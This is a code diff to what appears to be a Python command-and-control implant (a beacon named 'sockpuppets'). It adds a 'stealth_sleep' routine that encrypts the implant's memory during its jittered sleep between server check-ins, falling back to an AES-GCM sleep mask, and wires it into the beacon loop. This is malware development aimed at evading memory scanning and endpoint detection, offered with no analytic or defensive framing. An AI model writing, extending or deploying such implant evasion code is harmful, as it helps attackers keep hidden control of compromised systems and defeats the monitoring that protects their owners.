@@ -35,6 +35,14 @@ def simple_encrypt(data: str) -> str:
 def simple_decrypt(data: str) -> str:
     return wire_decrypt(data)
 
+def stealth_sleep(seconds):
+    secret = bytearray(globals().get('ENCRYPTION_KEY', b'sockpuppets-sleep-mask'))
+    try:
+        globals()['sleep_encrypt'](seconds, secret)
+        return
+    except Exception:
+        sleep_mask(seconds)
+
 def sleep_mask(seconds):
     import os
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -396,7 +404,7 @@ def connect_to_server():
 
                 # Sleep with jitter
                 sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
-                sleep_mask(sleep_time)
+                stealth_sleep(sleep_time)
 
             else:
                 # Long-poll mode: checkin, server holds connection up to 30s
